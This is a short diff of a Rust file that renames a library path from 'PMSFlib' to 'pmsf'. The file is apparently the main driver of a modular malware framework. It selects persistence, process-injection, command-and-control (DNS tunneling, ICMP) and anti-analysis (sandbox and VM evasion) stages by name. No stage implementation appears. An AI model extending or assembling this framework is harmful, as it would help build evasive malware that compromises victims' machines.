@@ -1,4 +1,4 @@
-use PMSFlib::{
+use pmsf::{
     establish_persistence_poly, perform_anti_analysis_poly, execute_code_poly, communicate_c2_poly, FrameworkConfig
 };
 use std::fs;
@@ -11,37 +11,37 @@ fn main() {
     println!("Loaded config: {:?}", config);
 
     // Helper closures for selecting implementations by name
-    fn select_persistence(name: &str) -> Box<dyn PMSFlib::PersistenceStage> {
+    fn select_persistence(name: &str) -> Box<dyn pmsf::PersistenceStage> {
         match name {
-            "RegistryRunKeys" => Box::new(PMSFlib::RegistryRunKeys),
-            "ScheduledTasks" => Box::new(PMSFlib::ScheduledTasks),
-            "WMIEventSubscription" => Box::new(PMSFlib::WMIEventSubscription),
+            "RegistryRunKeys" => Box::new(pmsf::RegistryRunKeys),
+            "ScheduledTasks" => Box::new(pmsf::ScheduledTasks),
+            "WMIEventSubscription" => Box::new(pmsf::WMIEventSubscription),
             _ => establish_persistence_poly(),
         }
     }
-    fn select_execution(name: &str) -> Box<dyn PMSFlib::ExecutionStage> {
+    fn select_execution(name: &str) -> Box<dyn pmsf::ExecutionStage> {
         match name {
-            "ClassicProcessInjection" => Box::new(PMSFlib::ClassicProcessInjection),
-            "MappingInjection" => Box::new(PMSFlib::MappingInjection),
-            "ThreadHijacking" => Box::new(PMSFlib::ThreadHijacking),
-            "DirectSyscallExecution" => Box::new(PMSFlib::DirectSyscallExecution),
+            "ClassicProcessInjection" => Box::new(pmsf::ClassicProcessInjection),
+            "MappingInjection" => Box::new(pmsf::MappingInjection),
+            "ThreadHijacking" => Box::new(pmsf::ThreadHijacking),
+            "DirectSyscallExecution" => Box::new(pmsf::DirectSyscallExecution),
             _ => execute_code_poly(),
         }
     }
-    fn select_c2(name: &str) -> Box<dyn PMSFlib::C2Stage> {
+    fn select_c2(name: &str) -> Box<dyn pmsf::C2Stage> {
         match name {
-            "HTTPSCommunication" => Box::new(PMSFlib::HTTPSCommunication),
-            "DNSTunneling" => Box::new(PMSFlib::DNSTunneling),
-            "ICMPCommunication" => Box::new(PMSFlib::ICMPCommunication),
-            "RawSocketsCommunication" => Box::new(PMSFlib::RawSocketsCommunication),
+            "HTTPSCommunication" => Box::new(pmsf::HTTPSCommunication),
+            "DNSTunneling" => Box::new(pmsf::DNSTunneling),
+            "ICMPCommunication" => Box::new(pmsf::ICMPCommunication),
+            "RawSocketsCommunication" => Box::new(pmsf::RawSocketsCommunication),
             _ => communicate_c2_poly(),
         }
     }
-    fn select_anti_analysis(name: &str) -> Box<dyn PMSFlib::AntiAnalysisStage> {
+    fn select_anti_analysis(name: &str) -> Box<dyn pmsf::AntiAnalysisStage> {
         match name {
-            "AntiDebugging" => Box::new(PMSFlib::AntiDebugging),
-            "VMDetection" => Box::new(PMSFlib::VMDetection),
-            "SandboxEvasion" => Box::new(PMSFlib::SandboxEvasion),
+            "AntiDebugging" => Box::new(pmsf::AntiDebugging),
+            "VMDetection" => Box::new(pmsf::VMDetection),
+            "SandboxEvasion" => Box::new(pmsf::SandboxEvasion),
             _ => perform_anti_analysis_poly(),
         }
     }
